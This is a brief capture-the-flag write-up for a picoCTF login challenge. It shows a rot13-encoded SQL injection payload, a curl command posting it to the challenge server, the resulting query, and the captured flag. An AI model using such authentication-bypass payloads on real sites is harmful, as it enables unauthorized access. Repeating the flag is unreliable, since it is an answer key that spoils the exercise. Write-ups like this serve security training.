## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
## Solución
```bash
' be 1=1;
# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}

```

```bash
victormcm-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>victormcm-picoctf@webshell:~$ 
```
## Notas Adicionales
Usa rot 13
## Referencias